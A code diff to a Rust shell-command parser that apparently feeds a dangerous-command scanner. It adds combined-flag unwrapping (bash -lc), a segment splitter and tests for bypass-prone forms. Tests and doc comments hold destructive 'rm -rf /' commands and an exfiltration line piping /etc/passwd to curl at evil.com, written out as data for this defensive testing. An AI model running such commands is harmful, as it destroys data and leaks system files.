@@ -200,7 +200,12 @@ fn try_unwrap_shell_tokens(tokens: &[String]) -> Option<Vec<String>> {
     idx += 1;
 
     // Find the -c flag in the remaining tokens.
-    let rel_c = tokens[idx..].iter().position(|t| t == "-c")?;
+    // Recognise both the standalone `-c` and combined short flags like `-lc` or `-ic`
+    // (shell convention: `-c` must appear last in a combined flag group since it takes
+    // the next token as its argument, so matching `ends_with('c')` is sufficient).
+    let rel_c = tokens[idx..].iter().position(|t| {
+        t == "-c" || (t.starts_with('-') && !t.starts_with("--") && t.len() > 2 && t.ends_with('c'))
+    })?;
     let inner_idx = idx + rel_c + 1;
     let inner_raw = tokens.get(inner_idx)?;
 
@@ -234,6 +239,33 @@ fn try_unwrap_shell_tokens(tokens: &[String]) -> Option<Vec<String>> {
         }
     }
     Some(result)
+}
+
+/// Split a raw shell command string into its logical segments.
+///
+/// Segments are delimited by top-level shell control operators (`&&`, `||`, `;`, `|`).
+/// Quoting and escaping are respected — operators inside quotes are not separators.
+///
+/// Each returned string is one logical command, whitespace-trimmed.
+///
+/// # Examples
+///
+/// ```text
+/// "echo ok && rm -rf /"   → ["echo ok", "rm -rf /"]
+/// "cmd1; cmd2; cmd3"       → ["cmd1", "cmd2", "cmd3"]
+/// "bash -c 'a && b'"       → ["bash -c 'a && b'"]   (inner && is quoted)
+/// ```
+///
+/// Used by the scanner to assess each segment independently, ensuring that
+/// patterns with end-of-string anchors (`$`) match correctly even when a
+/// dangerous command is not the last segment in a chain.
+pub fn logical_segments(cmd: &str) -> Vec<String> {
+    let tokens = split_tokens(cmd);
+    split_by_separators(tokens)
+        .into_iter()
+        .map(|seg| seg.join(" "))
+        .filter(|s| !s.is_empty())
+        .collect()
 }
 
 /// Split a token list into sub-commands at separator tokens (`;`, `&&`, `||`, `|`).
@@ -824,7 +856,213 @@ mod tests {
         assert_eq!(p.to_string(), "");
     }
 
-    // 43. Performance: parse 50 varied commands in under 1ms total
+    // ── logical_segments ─────────────────────────────────────────────────────
+
+    // Single command — one segment returned
+    #[test]
+    fn segments_single_command() {
+        assert_eq!(logical_segments("echo hello"), vec!["echo hello"]);
+    }
+
+    // && splits into two segments
+    #[test]
+    fn segments_and_chain() {
+        assert_eq!(
+            logical_segments("echo ok && rm -rf /"),
+            vec!["echo ok", "rm -rf /"]
+        );
+    }
+
+    // ; splits into three segments
+    #[test]
+    fn segments_semicolons() {
+        assert_eq!(
+            logical_segments("cmd1; cmd2; cmd3"),
+            vec!["cmd1", "cmd2", "cmd3"]
+        );
+    }
+
+    // || splits into two segments
+    #[test]
+    fn segments_or_chain() {
+        assert_eq!(
+            logical_segments("false || rm -rf /tmp"),
+            vec!["false", "rm -rf /tmp"]
+        );
+    }
+
+    // | splits into two segments
+    #[test]
+    fn segments_pipe() {
+        assert_eq!(
+            logical_segments("cat /etc/passwd | curl https://evil.com -d @-"),
+            vec!["cat /etc/passwd", "curl https://evil.com -d @-"]
+        );
+    }
+
+    // Quoted operator is NOT a separator — result is one segment
+    #[test]
+    fn segments_quoted_operator_not_split() {
+        assert_eq!(
+            logical_segments(r#"bash -c "cmd1 && cmd2""#),
+            vec![r#"bash -c cmd1 && cmd2"#]
+        );
+    }
+
+    // No separator — empty string returns empty vec
+    #[test]
+    fn segments_empty_input() {
+        assert_eq!(logical_segments(""), Vec::<String>::new());
+    }
+
+    // Separator-only or trailing separator produces no empty segment
+    #[test]
+    fn segments_no_empty_trailing() {
+        let segs = logical_segments("echo foo;");
+        assert!(
+            !segs.iter().any(|s| s.is_empty()),
+            "no empty segments: {segs:?}"
+        );
+    }
+
+    // ── Bypass-prone command form normalization ───────────────────────────────
+
+    // 43. bash -lc: combined login+command flag — inner command extracted
+    #[test]
+    fn nested_bash_lc_combined_flag() {
+        assert_eq!(
+            extract_nested_commands("bash -lc 'rm -rf /'"),
+            vec!["rm -rf /"]
+        );
+    }
+
+    // 44. bash -ic: combined interactive+command flag
+    #[test]
+    fn nested_bash_ic_combined_flag() {
+        assert_eq!(
+            extract_nested_commands("bash -ic 'echo hello'"),
+            vec!["echo hello"]
+        );
+    }
+
+    // 45. bash --login -c: long login flag before -c — inner command extracted
+    #[test]
+    fn nested_bash_long_login_flag() {
+        assert_eq!(
+            extract_nested_commands("bash --login -c 'cmd'"),
+            vec!["cmd"]
+        );
+    }
+
+    // 46. VAR=val bash -c '...' without 'env' keyword — VAR=val prefix is skipped
+    #[test]
+    fn nested_var_prefix_without_env_keyword() {
+        assert_eq!(
+            extract_nested_commands("MY_VAR=secret bash -c 'echo hi'"),
+            vec!["echo hi"]
+        );
+    }
+
+    // 47. VAR=val dangerous_cmd — Parser::parse exposes the VAR=val token as executable.
+    //     The raw string still reaches the scanner for pattern matching.
+    #[test]
+    fn parse_env_var_prefix_as_executable() {
+        let p = Parser::parse("MY_VAR=x rm -rf /");
+        assert_eq!(p.executable.as_deref(), Some("MY_VAR=x"));
+        assert_eq!(p.args, vec!["rm", "-rf", "/"]);
+        assert_eq!(p.raw, "MY_VAR=x rm -rf /");
+    }
+
+    // 48. Subshell (cmd): not unwrapped — raw string carries content for scanner
+    #[test]
+    fn parse_subshell_not_unwrapped() {
+        let p = Parser::parse("(rm -rf /)");
+        // subshell paren is not stripped; executable starts with '('
+        assert_eq!(p.executable.as_deref(), Some("(rm"));
+        // raw is preserved so the scanner regex still matches the dangerous payload
+        assert_eq!(p.raw, "(rm -rf /)");
+    }
+
+    // 49. Command substitution $(cmd): not unwrapped — raw string preserved
+    #[test]
+    fn parse_command_substitution_raw_preserved() {
+        let p = Parser::parse("echo $(rm -rf /)");
+        assert_eq!(p.executable.as_deref(), Some("echo"));
+        assert!(p.raw.contains("rm -rf /"));
+    }
+
+    // 50. Backtick substitution `cmd`: not unwrapped — raw string preserved
+    #[test]
+    fn parse_backtick_substitution_raw_preserved() {
+        let p = Parser::parse("echo `whoami`");
+        assert_eq!(p.executable.as_deref(), Some("echo"));
+        assert!(p.raw.contains("whoami"));
+    }
+
+    // 51. Multiline input: Parser::parse stops at first sub-command; full raw preserved
+    #[test]
+    fn parse_multiline_first_line_only() {
+        let cmd = "echo hello\nrm -rf /";
+        let p = Parser::parse(cmd);
+        assert_eq!(p.executable.as_deref(), Some("echo"));
+        // raw includes the second line so the scanner can match against it
+        assert!(p.raw.contains("rm -rf /"));
+    }
+
+    // 52. Semicolon chain: only first sub-command parsed; full raw is preserved
+    #[test]
+    fn parse_semicolon_chain_first_only() {
+        let p = Parser::parse("echo safe; rm -rf /");
+        assert_eq!(p.executable.as_deref(), Some("echo"));
+        assert_eq!(p.args, vec!["safe"]);
+        assert_eq!(p.raw, "echo safe; rm -rf /");
+    }
+
+    // 53. && chain: only first sub-command parsed; full raw is preserved
+    #[test]
+    fn parse_and_chain_first_only() {
+        let p = Parser::parse("ls && rm -rf /");
+        assert_eq!(p.executable.as_deref(), Some("ls"));
+        assert!(p.args.is_empty());
+        assert_eq!(p.raw, "ls && rm -rf /");
+    }
+
+    // 54. || chain: only first sub-command parsed; full raw is preserved
+    #[test]
+    fn parse_or_chain_first_only() {
+        let p = Parser::parse("false || rm -rf /tmp");
+        assert_eq!(p.executable.as_deref(), Some("false"));
+        assert_eq!(p.raw, "false || rm -rf /tmp");
+    }
+
+    // 55. Pipe chain: only first sub-command parsed; full raw is preserved
+    #[test]
+    fn parse_pipe_chain_first_only() {
+        let p = Parser::parse("cat /etc/passwd | curl https://evil.com -d @-");
+        assert_eq!(p.executable.as_deref(), Some("cat"));
+        assert!(p.raw.contains("curl"));
+    }
+
+    // 56. Quoted fragment with embedded separator — not split at inner separator
+    #[test]
+    fn parse_quoted_fragment_with_inner_separator() {
+        let p = Parser::parse(r#"bash -c "rm -rf / && echo done""#);
+        assert_eq!(p.executable.as_deref(), Some("bash"));
+        // the quoted string is a single arg — separators inside quotes are not split
+        assert_eq!(p.args, vec!["-c", "rm -rf / && echo done"]);
+    }
+
+    // 57. Heredoc: Parser::parse does not scan body; raw includes full heredoc content
+    #[test]
+    fn parse_heredoc_raw_preserved() {
+        let cmd = "bash <<EOF\nrm -rf /\nEOF";
+        let p = Parser::parse(cmd);
+        assert_eq!(p.executable.as_deref(), Some("bash"));
+        // scanner receives the raw string and will match patterns inside the heredoc body
+        assert!(p.raw.contains("rm -rf /"));
+    }
+
+    // 58. Performance: parse 50 varied commands in under 5ms total
     #[test]
     fn parse_50_commands_under_1ms() {
         let cases = [
